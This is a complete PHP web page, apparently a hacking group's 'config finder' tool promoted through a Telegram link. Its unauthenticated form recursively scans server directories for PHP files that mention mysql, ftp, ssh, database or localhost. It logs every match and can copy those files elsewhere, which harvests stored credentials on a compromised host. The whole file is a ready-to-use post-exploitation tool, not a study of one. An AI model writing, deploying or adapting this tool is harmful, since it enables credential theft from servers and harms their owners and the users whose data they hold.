<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>OX TEAM CONFIG FINDER</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
        }
        h1 {
            text-align: center;
            margin-bottom: 30px;
        }
        form {
            background-color: #f0f0f0;
            padding: 20px;
            border-radius: 8px;
        }
        label {
            display: block;
            margin-bottom: 10px;
        }
        input[type="text"], input[type="submit"], input[type="checkbox"] {
            margin-bottom: 10px;
            padding: 8px;
            border: 1px solid #ccc;
            border-radius: 4px;
            width: 100%;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            cursor: pointer;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        .logo {
            text-align: center;
            margin-top: 20px;
        }
        .logo img {
            width: 100px;
            height: 100px;
            border-radius: 50%;
        }
        .telegram {
            text-align: center;
            margin-top: 10px;
        }
        .telegram a {
            text-decoration: none;
            background-color: #0088cc;
            color: white;
            padding: 5px 10px;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="logo">
        <img src="https://i.ibb.co/RbrW72w/ox.webps" alt="Logo">
    </div>
	<div class="telegram">
        <a href="https://t.me/opsxteam" target="_blank">Join our Telegram channel</a>
    </div>
    <h1>OX TEAM CONFIG FINDER</h1>
    
    <?php
    // Define the keywords to search for
    $keywords = [
        'localhost',
        'mysql',
        'mysqli',
        'ftp',
        'ssh',
        'database',
        // You can add more keywords here
    ];
    
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $directory = $_POST['directory'];
        $copyDirectory = !empty($_POST['copy_directory']) ? $_POST['copy_directory'] : null;
        $selectedKeywords = isset($_POST['keywords']) ? $_POST['keywords'] : [];

        if (!is_dir($directory)) {
            die("Invalid directory specified.");
        }

        $keywordsPattern = implode('|', array_map('preg_quote', $selectedKeywords));
        $keywordsPattern = "/($keywordsPattern)/i";

        $logFile = 'scan_results.log';
        file_put_contents($logFile, "Scan results for directory: $directory\n\n");

        function scanDirectory($dir, $keywordsPattern, $logFile, $copyDirectory) {
            $rii = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));

            foreach ($rii as $file) {
                if ($file->isDir() || $file->getExtension() !== 'php') {
                    continue;
                }

                $filePath = $file->getPathname();
                $fileContents = file_get_contents($filePath);
                $lines = explode("\n", $fileContents);

                foreach ($lines as $lineNumber => $lineContent) {
                    if (preg_match($keywordsPattern, $lineContent)) {
                        $logMessage = "Keyword found in file: $filePath at line $lineNumber\n";
                        file_put_contents($logFile, $logMessage, FILE_APPEND);

                        if ($copyDirectory) {
                            if (!is_dir($copyDirectory)) {
                                mkdir($copyDirectory, 0777, true);
                            }
                            $destination = $copyDirectory . DIRECTORY_SEPARATOR . basename($filePath);
                            copy($filePath, $destination);
                        }

                        break;
                    }
                }
            }
        }

        scanDirectory($directory, $keywordsPattern, $logFile, $copyDirectory);

        echo "<p>Scan complete. Results saved in <strong>$logFile</strong>.</p>";
    }
    ?>

    <form action="" method="post">
        <label for="directory">Directory to scan:</label>
        <input type="text" id="directory" name="directory" required><br>

        <label for="copy_directory">Directory to copy files (optional):</label>
        <input type="text" id="copy_directory" name="copy_directory"><br>

        <h3>Select keywords to scan for:</h3>
        <?php foreach ($keywords as $keyword): ?>
            <input type="checkbox" id="<?php echo $keyword; ?>" name="keywords[]" value="<?php echo $keyword; ?>" checked>
            <label for="<?php echo $keyword; ?>"><?php echo $keyword; ?></label><br>
        <?php endforeach; ?>

        <input type="submit" value="Scan">
    </form>
</body>
</html>
